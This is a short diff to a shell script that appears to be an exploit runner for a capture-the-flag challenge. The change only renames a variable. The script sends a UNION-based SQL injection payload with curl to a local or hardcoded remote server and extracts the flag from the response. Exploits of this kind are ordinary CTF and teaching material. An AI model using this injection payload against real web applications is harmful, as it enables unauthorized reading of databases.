@@ -3,16 +3,16 @@ PORT=8083
 
 if [[ $1 == "local" ]]
 then
-    remote='http://127.0.0.1:'$PORT
+    url='http://127.0.0.1:'$PORT
 elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
 then
-    remote='http://141.85.224.118:'$PORT
+    url='http://141.85.224.118:'$PORT
 else
-    remote=$1':'$2
+    url=$1':'$2
 fi
 
 # Demo
 echo "Start exploit for Demo"
-flag=$(curl -s $remote --data-raw "surname=admin' UNION select v,null,null from flags -- " | grep -o "SSS{.*}")
+flag=$(curl -s $url --data-raw "surname=admin' UNION select v,null,null from flags -- " | grep -o "SSS{.*}")
 echo "Flag is $flag"
 echo "----------------------------"
